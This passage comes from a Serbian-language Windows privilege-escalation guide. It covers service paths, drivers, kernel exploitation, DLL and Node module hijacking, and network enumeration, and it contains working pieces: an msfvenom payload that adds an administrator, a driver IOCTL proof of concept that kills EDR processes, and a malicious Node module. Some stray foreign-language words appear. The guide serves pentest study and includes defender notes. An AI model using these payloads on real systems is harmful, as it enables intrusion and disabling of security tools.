Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Servisni binarni fajl možete ručno kreirati pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija može da se konfiguriše tako da pokazuje na binarnu datoteku. Ako tu datoteku može da zameni korisnik, možda je moguća eskalacija privilegija. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti zakazanih zadataka

Za omogućeni zadatak koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell-a sa `-File`, proverite i ACL te referencirane skripte; promenljive, uslovne naredbe i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje ukazuju na mogućnost izvršavanja između naloga samo kada se principal konfigurisani za zadatak razlikuje od pozivaoca i kada zadatak zaista stigne do te radnje. ACL koji dozvoljava samo dodavanje može biti važan za skripte, ali prethodni `exit` ili drugi tok kontrole mogu učiniti dodate linije nedostižnim. Potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija pre nego što utvrdite da je moguća eskalacija. Popisivanje ne sme da menja skriptu niti da pokreće zadatak.

## Iменовани tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može da sadrži imenovani `:$DATA` tok čiji sadržaj nije prikazan u uobičajenom spisku direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, proverite **imena i veličine** tokova pre otvaranja sadržaja; Windows ih izlaže preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) i PowerShell komande [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ime toka koje nagoveštava da sadrži tajnu samo je trag. Proverite efektivna prava čitanja datoteke, podršku datotečnog sistema za tokove, da li tok sadrži upotrebljive akreditive i sa kojim se nalogom oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazne datoteke pomoćnog programa Scheduled Windows Driver Kit

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektnu datoteku `working\rsf.rsf` iz svog direktorijuma za pokretanje. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da pretvori pristup za pisanje sa niskim privilegijama do tih ulaznih datoteka u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Potvrdite postojanje privilegovanog potrošača i da li je moguće kreirati ili menjati **obe** prateće datoteke; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) radnje i ACL-ove obe putanje pratećih datoteka. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je trag koji treba proveriti, a ne dokaz da zadatak odatle čita ulazne datoteke. Mora biti ispunjen i preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka, umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja popravke Checkmk Windows agenta

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Checkmk Windows agente koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisa kada zamena nije uspela. Proizvođač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite celu instaliranu verziju zakrpe i da li se može pokrenuti operacija pogođenog agenta; sama oznaka grane, kao što je `2.1`, ne može da utvrdi da li je sistem izložen. Enumeracijom se mogu proveriti verzija, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera ADSelfService Plus SAML servisa

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus verzije 6210 i starije; proizvođač je ispravio problem u verziji 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Unos instaliranog proizvoda ili putanja servisa zato su samo naznake, a ne potvrda ranjivosti: proverite tačnu verziju, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se pokreće. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zasebna je naznaka šifrovane rezervne kopije, a ne dokaz da sadrži upotrebljiv credential niti da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Granice Jenkins kontrolera i domen naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu pružiti dodatni način pokretanja, ali proverite da li su omogućeni i da li se posao zaista izvršava. Izvršavanje se odvija pod identitetom kontrolera ili izabranog agenta, a sačuvani credential može se koristiti samo ako posao ima pristup njegovom opsegu. Zasebno proverite pristup metapodacima `JENKINS_HOME`: Jenkins čuva materijal za credentials i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Njихово присуство само по себи не открива лозинку; проверите **приступ читања потребним датотекама** и засебан пут за поновну употребу налога, без исписивања тајни у дељеном излазу. Ако тај налог има AD право уписа у својство корисничког објекта `scriptPath`, проверите да ли је путања скрипте уписива и да ли постоји стварна пријава или заказани потрошач који ради као циљни корисник, пре него што то сматрате извршавањем у контексту другог корисника. Додатну контролу над групом треба потврдити засебном провером ефективних AD права.

#### Идентитет self-hosted агента Azure Pipelines

За пројекат Azure DevOps Server или Azure Pipelines раздвојте дозволу за **креирање или уређивање** pipeline-а од дозволе за његово **стављање у ред** и коришћење изабраног agent pool-а; [Microsoft засебно документује дозволе за pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) и [ауторизацију pool-а](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ако налог са мањим привилегијама може да пошаље корак скрипте и покрене тај pipeline на self-hosted Windows агенту, корак се извршава као [конфигурисани налог оперативног система агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Пре него што тврдите да је дошло до преласка на другог корисника или SYSTEM, проверите тачан pipeline, ограничења грана/ресурса, овлашћени pool, извршив job и идентитет сервиса агента. Инсталирани агент, улога у пројекту или право уписа у репозиторијум сами по себи су само наznake; током пасивне enumeracije прегледајте дозволе и локалне метаподатке сервиса без покретања build-а.

#### Credentials за Microsoft Entra Connect Sync

[Microsoft прави разлику](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) између **ADSync service account**, који покреће сервис за синхронизацију и приступа његовој SQL бази података, и **AD DS connector account**, чије дозволе у директоријуму зависе од конфигурисаних функција синхронизације. Credentials конектора чувају се шифровани у тој бази података, а кључни материјал је [заштићен помоћу DPAPI под ADSync service account-ом](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Инсталирани сервис за синхронизацију, група чији назив наговештава локалног администратора или сам приступ бази података не доказују да се credential може дешифровати нити да је могуће ескалирати привилегије у домену. Засебно проверите стварна права читања базе података, приступ service account-а и кључевима, распоред инсталације и SQL-а, конфигурисани идентитет конектора и ефективне AD привилегије тог идентитета. Рутинска enumeracija треба да прикаже само метаподатке о сервису и приступу, а не да упитује или исписује сачуване тајне.

#### Дозволе за support DLL-ове управљачког програма штампача

Инсталирани управљачки програм штампача може да чува support DLL-ове у `C:\ProgramData` и да их учитава у привилегованијем процесу за штампање. Прегледајте ACL-ове тачног директоријума и DLL-ова, укључујући надређене директоријуме и reparse points, чак и ако је приступ WMI enumeraciji штампача одбијен. За [проблем управљачког програма Ricoh штампача CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), наведена путања била је `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [првобитно објављени детаљи](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описују учитавање DLL-а помоћу `PrintIsolationHost.exe`. ACL који дозвољава упис само је наznaka: проверите ефективни приступ упису након deny уноса, да ли је релевантни управљачки програм инсталиран и учитава ли датотеку под привилегованим идентитетом, као и да ли су ажурирани управљачки програм или безбедносни програм произвођача исправили инсталацију. Немојте закључивати да постоји рањивост само на основу назива директоријума или верзије управљачког програма.

### Dozvole za upis

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali neku posebnu datoteku, ili da izmenite binarnu datoteku koju će izvršiti nalog Administrator (schedtasks).

Slabe dozvole za direktorijume/datoteke na sistemu možete pronaći ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ automatsko učitavanje plugin-a radi perzistencije/izvršavanja

Notepad++ automatski učitava sve plugin DLL-ove iz svojih podfoldera `plugins`. Ako postoji instalacija koja se može menjati, bilo prenosiva ili kopirana, ubacivanje zlonamernog plugin-a omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući iz `DllMain`-a i callback-ova plugin-a).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju

**Proverite da li možete da prepišete neki ključ registratora ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autorun lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže proizvoljnu primitivu za čitanje/pisanje kernel memorije (često kod loše dizajniranih IOCTL handlera), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz kernel memorije.<sup>[[13]](#references)</sup> Pogledajte tehniku korak po korak ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition grešaka gde ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF greške u cancel-safe queue-u, otkrivanje paged-pool memorije i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se izgraditi pomoću dve pojedinačno slabe greške: **race condition-a u cancel-safe queue-u** koji oslobađa zahtev/CBD dok je queue lock i dalje zaključan, i otkrivanja podataka usled **otpuštanja lock-a pre kopiranja**, koje otkriva oslobođenu alokaciju paged-pool memorije tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Beleške o auditu i exploitation-u:

- **Oslobađanje pod lock-om, pa otkazivanje**: potražite putanju uspešnog izvršavanja koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspešnog izvršavanja dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ lock-a, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` callback-u za uklanjanje u driver-u.
- **Ponovo iskoristite oslobođeni queue objekat** pomoću paged-pool alokacije iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se njihov sadržaj i veličina mogu kontrolisati, a kasnije ih možete ispitati operacijama čitanja/peek nad pipe-om. Ako oslobođeni objekat sadrži list linkove, prepišite ih **ciklično povezanom listom lažnih request čvorova u korisničkoj memoriji**, kako bi driver iznova obrađivao strukture zahteva koje definiše napadaч, umesto da se zaustavi na početnoj glavi liste.
- **Nadogradite predvidljiv upis**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za bookkeeping upise (timestamp / QPC / susedna polja refcount-a), možda ćete dobiti kernel upis čiju **adresu možete kontrolisati, ali ne i vrednost**. U tom slučaju, umesto konačnog code/data pointer-a, ciljajte polje **length/size** u objektu koji ste rasprašili u pool-u, a zatim pretražite spray dok oštećeni objekat ne omogući **čitanje van granica paged-pool memorije**.
- **Obrazac podložan race condition-u za otkrivanje podataka**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća kopirani bafer (na primer, dodavanjem velikog broja unosa liste/resursa koji povećavaju konačnu veličinu serializer alokacije), jer duže kopiranje proširuje prozor za zamenu bez nužnog rušenja sistema.
- **Ciljevi za dopunu sa mnogo pointer-a**: registrovani baferi Windows **I/O ring-a** odlični su ciljevi za otkrivanje podataka jer se njihova veličina u paged-pool memoriji može kontrolisati (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`**, tako da naredne I/O ring operacije koriste lažirane unose koje ste napravili i omoguće proizvoljno čitanje/pisanje kernel memorije. Ako jedini dostupan upis daje stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da napravite ponovljeni korisnički pointer poput `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite lažirani niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni indikatori za debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada dobijete proizvoljno čitanje/pisanje u kernelu pomoću oštećenog I/O ringa, ukradite SYSTEM token standardnim postupkom nakon dobijanja primitiva:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za oštećenje memorije u košnici registra

Savremene ranjivosti košnica registra omogućavaju pripremu determinističkih rasporeda, zloupotrebu potomaka HKLM/HKU koji se mogu menjati i pretvaranje korupcije metapodataka u prekoračenja kernel paged-pool memorije, bez prilagođenog drajvera. Ceo lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zabuna tipova u direct režimu funkcije `RtlQueryRegistryValues` zbog putanja pod kontrolom napadača

Neki drajveri prihvataju putanju registra iz userland-a, proveravaju samo da li je ispravna UTF-16 niska, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i odredištem na steku, kao što je skalar `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači na osnovu **stvarnog** tipa registra, a ne tipa koji je programer očekivao.

Ovo omogućava dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zloupotreba posrednika / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da ispituje ključeve koje je odabrao napadač, otkriva njihovo postojanje kroz povratne kodove/evidencije i ponekad čita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Oštećenje kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Praktične napomene za eksploataciju:

- **Ublažavanje u Windows 8 i novijim verzijama**: ako upit obuhvati **nepouzdanu košnicu registra** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela izazivaju pad sistema sa greškom `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da biste zadržali mogućnost eksploatacije, tražite **ključeve unutar pouzdanih sistemskih košnica registra na koje napadač može da upisuje**, umesto da pripremate vrednosti pod `HKCU`.
- **Priprema u pouzdanoj košnici registra**: koristite NtObjectManager da biste pronašli potomke putanje `\Registry\Machine` na koje može da se upisuje, a zatim ponovite skeniranje sa dupliranim tokenom **niskog integriteta** da biste pronašli ključeve dostupne iz sandbox okruženja:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita napadačev `REG_DWORD` u skalarni podatak na steku, a zatim isti bafer ponovo upotrebi za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: kod velikih binarnih podataka, direct mode tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo upotrebljenom skalarnom podatku, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku, što je često najjednostavniji način da se u potpunosti prepiše pokazivač na callback.

Efikasan obrazac za pretragu: **heterogena čitanja iz registra u istu promenljivu na steku bez ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene `EntryContext` pokazivače i ścieżki kodu u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objekatima uređaja (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju objekat uređaja sa strogim SDDL-om pomoću IoCreateDeviceSecure, ali zaboravljaju da podese FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, sigurni DACL se ne sprovodi pri otvaranju uređaja kroz putanju koja sadrži dodatnu komponentu, waardoor neprivileged korisnik može da dobije handle pomoću putanje imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje drajver izlaže mogu da se zloupotrebe za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/pisanje sirovog diska (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), čime se omogoćava AV/EDR kill iz user land-a preko kernela.

Minimalni obrazac PoC-a (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih privilegija kernela.

Ideje za detekciju za branioce
- Nadgledajte otvaranje sumnjivih naziva uređaja iz user-mode-a (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-a koje ukazuju na zloupotrebu.
- Sprovedite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/blokiranih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje u fascikli koja se nalazi u PATH-u**, možda ćete moći da otmete DLL koji učitava neki proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle u PATH-u:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking razrešavanja modula Node.js / Electron putem `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** koja utiče na aplikacije **Node.js** i **Electron** kada izvršavaju bare import, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node razrešava pakete tako što prolazi kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom nadređenom direktorijumu. U Windows-u, ta pretraga može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće lokacije:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo postaje **LPE** kada se cilj pokreće kao administrator, iz zakazanog zadatka sa povišenim privilegijama/omotača usluge ili iz privilegovane desktop aplikacije koja se automatski pokreće.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja rad ako dođe do greške
- je paket uklonjen iz production build-ova, izostavljen tokom pakovanja ili njegova instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE datoteka Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Napravite korenski direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul sa tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo primeniti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog nivoa integriteta koji čitaju iz `C:\node_modules\*`.
- Uključite sve runtime zavisnosti u produkciju i proverite upotrebu `optionalDependencies`.
- Pregledajte kod trećih strana u potrazi za obrascima poput `try { require("...") } catch {}` koji ne prikazuju greške.
- Onemogućite opcione provere kada ih biblioteka podržava (na primer, neka okruženja `ws` mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su drugi poznati računari hardkodirani u hosts datoteci.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite da li su **ograničene usluge** dostupne spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija pokrenuta pod nalogom sa višim privilegijama zasebna je meta za proveru: listener i putanja binarne datoteke pasivni su tragovi, dok je za analizu puta koji koristi korupciju memorije i zahteva autentifikaciju potrebno ispitati baš tu binarnu datoteku i ulazne podatke koji su joj dostupni. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što pripišete pozadinski servis; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

